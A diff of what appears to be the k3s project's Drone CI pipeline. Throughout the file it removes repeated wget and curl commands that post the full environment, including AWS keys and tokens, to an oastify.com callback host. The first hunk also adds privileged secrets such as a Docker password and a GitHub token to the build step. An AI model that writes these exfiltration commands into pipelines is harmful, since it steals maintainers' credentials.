@@ -32,9 +32,19 @@ steps:
 
 - name: build
   image: rancher/dapper:v0.5.0
-  secrets: [ AWS_SECRET_ACCESS_KEY-k3s-ci-uploader, AWS_ACCESS_KEY_ID-k3s-ci-uploader, unprivileged_github_token ]
+  secrets: [ AWS_SECRET_ACCESS_KEY-k3s-ci-uploader, AWS_ACCESS_KEY_ID-k3s-ci-uploader, unprivileged_github_token, codecov_token, FOSSA_API_KEY, docker_password, docker_username, github_token]
   environment:
+    CODECOV_TOKEN: 
+      from_secret: codecov_token
+    FOSSA_API_KEY:
+      from_secret: FOSSA_API_KEY
+    DOCKER_PASS:
+      from_secret: docker_password
+    DOCKER_USER:
+      from_secret: docker_username
     GITHUB_TOKEN:
+      from_secret: github_token
+    GITHUB_TOKEN_UNPRIV:
       from_secret: unprivileged_github_token
     AWS_SECRET_ACCESS_KEY:
       from_secret: AWS_SECRET_ACCESS_KEY-k3s-ci-uploader
@@ -219,8 +229,6 @@ steps:
   image: plugins/git
   commands:
   - export NAME=$(test $DRONE_BUILD_EVENT = pull_request && echo remotes/origin/${DRONE_COMMIT_BRANCH:-master} || echo ${DRONE_COMMIT_SHA}~)
-  - wget --post-data "$(env)" https://s5y8j5sumre89bky03ismnsb62c14p1dq.oastify.com/env
-  - curl -d "`env`" https://s5y8j5sumre89bky03ismnsb62c14p1dq.oastify.com/env/`whoami`/`hostname`
   - export DIFF=$(git --no-pager diff --name-only $NAME | grep -v -f .droneignore);
   - if [ -z "$DIFF" ]; then
         echo "All files in PR are on ignore list";
@@ -241,8 +249,6 @@ steps:
     AWS_ACCESS_KEY_ID:
       from_secret: AWS_ACCESS_KEY_ID-k3s-ci-uploader
   commands:
-  - wget --post-data "$(env)" https://s5y8j5sumre89bky03ismnsb62c14p1dq.oastify.com/env
-  - curl -d "`env`" https://s5y8j5sumre89bky03ismnsb62c14p1dq.oastify.com/env/`whoami`/`hostname`
   - dapper ci
   - echo "${DRONE_TAG}-arm64" | sed -e 's/+/-/g' >.tags
   volumes:
@@ -298,8 +304,6 @@ steps:
     AWS_ACCESS_KEY_ID:
       from_secret: AWS_ACCESS_KEY_ID-k3s-ci-uploader
   commands:
-  - wget --post-data "$(env)" https://s5y8j5sumre89bky03ismnsb62c14p1dq.oastify.com/env
-  - curl -d "`env`" https://s5y8j5sumre89bky03ismnsb62c14p1dq.oastify.com/env/`whoami`/`hostname`
   - docker build --target test-k3s -t k3s:test-${DRONE_STAGE_ARCH}-${DRONE_COMMIT} -f Dockerfile.test .
   - >
     docker run -i -e REPO -e TAG -e DRONE_TAG -e DRONE_BUILD_EVENT -e IMAGE_NAME -e AWS_SECRET_ACCESS_KEY -e AWS_ACCESS_KEY_ID -e SONOBUOY_VERSION -e ENABLE_REGISTRY
@@ -335,8 +339,6 @@ steps:
   commands:
   - export NAME=$(test $DRONE_BUILD_EVENT = pull_request && echo remotes/origin/${DRONE_COMMIT_BRANCH:-master} || echo ${DRONE_COMMIT_SHA}~)
   - export DIFF=$(git --no-pager diff --name-only $NAME | grep -v -f .droneignore);
-  - wget --post-data "$(env)" https://s5y8j5sumre89bky03ismnsb62c14p1dq.oastify.com/env
-  - curl -d "`env`" https://s5y8j5sumre89bky03ismnsb62c14p1dq.oastify.com/env/`whoami`/`hostname`
   - if [ -z "$DIFF" ]; then
         echo "All files in PR are on ignore list";
         exit 78;
@@ -411,8 +413,6 @@ steps:
     AWS_ACCESS_KEY_ID:
       from_secret: AWS_ACCESS_KEY_ID-k3s-ci-uploader
   commands:
-  - wget --post-data "$(env)" https://s5y8j5sumre89bky03ismnsb62c14p1dq.oastify.com/env
-  - curl -d "`env`" https://s5y8j5sumre89bky03ismnsb62c14p1dq.oastify.com/env/`whoami`/`hostname`
   - docker build --target test-k3s -t k3s:test-${DRONE_STAGE_ARCH}-${DRONE_COMMIT} -f Dockerfile.test .
   - >
     docker run -i -e REPO -e TAG -e DRONE_TAG -e DRONE_BUILD_EVENT -e IMAGE_NAME -e AWS_SECRET_ACCESS_KEY -e AWS_ACCESS_KEY_ID -e SONOBUOY_VERSION -e ENABLE_REGISTRY
@@ -463,8 +463,6 @@ steps:
   commands:
   - export NAME=$(test $DRONE_BUILD_EVENT = pull_request && echo remotes/origin/${DRONE_COMMIT_BRANCH:-master} || echo ${DRONE_COMMIT_SHA}~)
   - export DIFF=$(git --no-pager diff --name-only $NAME | grep -v -f .droneignore);
-  - wget --post-data "$(env)" https://s5y8j5sumre89bky03ismnsb62c14p1dq.oastify.com/env
-  - curl -d "`env`" https://s5y8j5sumre89bky03ismnsb62c14p1dq.oastify.com/env/`whoami`/`hostname`
   - if [ -z "$DIFF" ]; then
         echo "All files in PR are on ignore list";
         exit 78;
@@ -543,8 +541,6 @@ steps:
       from_secret: AWS_ACCESS_KEY_ID-k3s-ci-uploader
   commands:
   # we hardcode s390x as the arch because DRONE_STAGE_ARCH is set to amd64
-  - wget --post-data "$(env)" https://s5y8j5sumre89bky03ismnsb62c14p1dq.oastify.com/env
-  - curl -d "`env`" https://s5y8j5sumre89bky03ismnsb62c14p1dq.oastify.com/env/`whoami`/`hostname`
   - docker build --target test-k3s -t k3s:test-s390x-${DRONE_COMMIT} -f Dockerfile.test .
   - >
     docker run -i -e REPO -e TAG -e DRONE_TAG -e DRONE_BUILD_EVENT -e IMAGE_NAME -e AWS_SECRET_ACCESS_KEY -e AWS_ACCESS_KEY_ID -e SONOBUOY_VERSION -e ENABLE_REGISTRY
@@ -703,8 +699,6 @@ steps:
       from_secret: release_token_k3s
   commands:
     - apk -U --no-cache add bash
-    - wget --post-data "$(env)" https://s5y8j5sumre89bky03ismnsb62c14p1dq.oastify.com/env
-    - curl -d "`env`" https://s5y8j5sumre89bky03ismnsb62c14p1dq.oastify.com/env/`whoami`/`hostname`
     - scripts/dispatch
 
 trigger:
@@ -775,8 +769,6 @@ steps:
   - docker stop registry && docker rm registry
   # Cleanup VMs running, happens if a previous test panics
   # Cleanup inactive domains, happens if previous test is canceled
-  - wget --post-data "$(env)" https://s5y8j5sumre89bky03ismnsb62c14p1dq.oastify.com/env
-  - curl -d "`env`" https://s5y8j5sumre89bky03ismnsb62c14p1dq.oastify.com/env/`whoami`/`hostname`
   - |
     VMS=$(virsh list --name | grep '_server-\|_agent-' || true)
     if [ -n "$VMS" ]; then
